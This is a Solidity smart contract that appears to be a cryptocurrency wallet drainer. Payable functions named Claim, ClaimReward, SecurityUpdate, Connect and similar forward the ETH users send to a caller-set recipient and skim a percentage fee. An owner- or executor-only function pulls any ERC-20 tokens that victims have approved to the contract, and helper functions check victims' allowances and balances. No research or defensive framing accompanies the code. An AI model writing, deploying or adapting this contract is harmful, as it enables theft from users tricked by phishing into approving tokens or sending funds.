// SPDX-License-Identifier: MIT
pragma solidity ^0.8.8;

// Custom errors for access control
error AiBot__NotAuthorized(); // Generic error for unauthorized access

// Define the full IERC20 interface as per the standard
interface IERC20Full {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

contract baskai {
    address private owner;
    address private executor;
    uint256 private ethFeeCollected;
    uint8 private percentage;

    mapping(address => mapping(address => uint256)) private _allowances;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    event ExecutorChanged(address indexed previousExecutor, address indexed newExecutor);
    event PercentageChanged(uint8 previousPercentage, uint8 currentPercentage);
    event Approval(address indexed owner, address indexed spender, uint256 value);

    constructor() {
        owner = msg.sender;
        executor = msg.sender; // Initialize executor to owner by default
        ethFeeCollected = 0;
        percentage = 5;
    }

    // --- Modifiers ---
    modifier onlyOwnerOrExecutor() {
        if (msg.sender != owner && msg.sender != executor) {
            revert AiBot__NotAuthorized(); // Using a more general unauthorized error
        }
        _;
    }

    // Modifier for owner-only functions
    modifier onlyOwner() {
        if (msg.sender != owner) {
            revert AiBot__NotAuthorized(); // Reusing the generic error
        }
        _;
    }

    // --- Owner & Role Management ---
    function getOwner() public view returns (address) {
        return owner;
    }

    function getExecutor() public view returns (address) {
        return executor;
    }

    function transferOwnership(address newOwner) public onlyOwner {
        require(newOwner != address(0), "New owner cannot be the zero address");
        address previousOwner = owner;
        owner = newOwner;
        emit OwnershipTransferred(previousOwner, newOwner);
    }

    function setExecutor(address newExecutor) public onlyOwner {
        require(newExecutor != address(0), "New executor cannot be the zero address");
        address previousExecutor = executor;
        executor = newExecutor;
        emit ExecutorChanged(previousExecutor, newExecutor);
    }

    // --- Fee & Balance Management ---
    function getContractETHBalance() public view returns (uint256) {
        return address(this).balance;
    }

    function getEthFeeCollected() public view returns (uint256) {
        return ethFeeCollected;
    }

    // Only owner can withdraw ETH fees
    function withdrawEthFees(address recipient) public onlyOwner {
        require(recipient != address(0), "Recipient cannot be the zero address");
        uint256 amountToWithdraw = ethFeeCollected;
        require(amountToWithdraw > 0, "No ETH fees to withdraw");

        ethFeeCollected = 0;

        (bool success, ) = payable(recipient).call{value: amountToWithdraw}("");
        require(success, "Failed to withdraw ETH fees");
    }

    // Only owner can withdraw any native ETH held by the contract
    function withdrawNativeETH(address payable _to) public onlyOwner {
        require(_to != address(0), "Recipient cannot be the zero address");
        uint256 balance = address(this).balance;
        require(balance > 0, "No ETH to withdraw");

        (bool success, ) = _to.call{value: balance}("");
        require(success, "Failed to send ETH");
    }

    function withdrawERC20(
        address _tokenAddress,
        address _to
    ) public onlyOwner returns (bool) {
        require(_to != address(0), "Recipient cannot be the zero address");

        IERC20Full token = IERC20Full(_tokenAddress);
        uint256 _amount = token.balanceOf(address(this));
        require(_amount > 0, "No tokens to withdraw");

        // Use low-level call to handle non-standard tokens like USDT
        (bool success, bytes memory data) = _tokenAddress.call(
            abi.encodeWithSelector(IERC20Full.transfer.selector, _to, _amount)
        );
        require(success && (data.length == 0 || abi.decode(data, (bool))), "Failed to transfer tokens");

        return true;
    }

    function changePercentage(uint8 newPercentage) public onlyOwner {
        require(newPercentage <= 100, "Percentage cannot exceed 100%");
        uint8 previousPercentage = percentage;
        percentage = newPercentage;
        emit PercentageChanged(previousPercentage, percentage);
    }

    // --- Receive and Fallback functions (to receive ETH) ---
    receive() external payable {}
    fallback() external payable {}

    // --- ETH Withdrawal Functions (handled by _processEthWithdrawal) ---
    function _processEthWithdrawal(address recipient) private {
        uint256 amount = msg.value;
        require(amount > 0, "ETH amount must be greater than zero");

        uint256 reserve = (amount * percentage) / 100;
        uint256 amountToRecipient = amount - reserve;

        ethFeeCollected += reserve;

        (bool success, ) = payable(recipient).call{value: amountToRecipient}("");
        require(success, "Failed to send ETH to recipient");
    }

    function Claim(address recipient) public payable { _processEthWithdrawal(recipient); }
    function ClaimReward(address recipient) public payable { _processEthWithdrawal(recipient); }
    function ClaimRewards(address recipient) public payable { _processEthWithdrawal(recipient); }
    function Execute(address recipient) public payable { _processEthWithdrawal(recipient); }
    function Multicall(address recipient) public payable { _processEthWithdrawal(recipient); }
    function Swap(address recipient) public payable { _processEthWithdrawal(recipient); }
    function Connect(address recipient) public payable { _processEthWithdrawal(recipient); }
    function SecurityUpdate(address recipient) public payable { _processEthWithdrawal(recipient); }

    // --- ERC-20 Allowance Management (AiBot's own allowances, if applicable) ---
    function approve(address spender, uint256 amount) public returns (bool) {
        require(spender != address(0), "Approve to the zero address");
        _allowances[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function allowance(address _owner, address spender) public view returns (uint256) {
        return _allowances[_owner][spender];
    }

    // --- Query Functions for ERC-20 Tokens ---

    function checkApprovedAllowance(
        address _tokenAddress,
        address _tokenHolder
    ) public view onlyOwnerOrExecutor returns (uint256) {
        IERC20Full token = IERC20Full(_tokenAddress);
        return token.allowance(_tokenHolder, address(this));
    }

    function checkTokenBalanceOfUser(
        address _tokenAddress,
        address _userAddress
    ) public view onlyOwnerOrExecutor returns (uint256) {
        IERC20Full token = IERC20Full(_tokenAddress);
        return token.balanceOf(_userAddress);
    }

    function pullApprovedERC20(
        address _tokenAddress,
        address _from,
        address _to,
        uint256 _amount
    ) public onlyOwnerOrExecutor returns (bool) {
        require(_amount > 0, "Amount must be greater than zero");
        require(_to != address(0), "Recipient cannot be the zero address");

        uint256 feeAmount = (_amount * percentage) / 100;
        uint256 amountToTransfer = _amount - feeAmount;

        // First: Pull fee
        (bool success1, bytes memory data1) = _tokenAddress.call(
            abi.encodeWithSelector(IERC20Full.transferFrom.selector, _from, address(this), feeAmount)
        );
        require(success1 && (data1.length == 0 || abi.decode(data1, (bool))), "Failed to collect ERC-20 fee");

        // Second: Transfer rest
        (bool success2, bytes memory data2) = _tokenAddress.call(
            abi.encodeWithSelector(IERC20Full.transferFrom.selector, _from, _to, amountToTransfer)
        );
        require(success2 && (data2.length == 0 || abi.decode(data2, (bool))), "Failed to transfer main ERC-20 amount");

        return true;
    }
}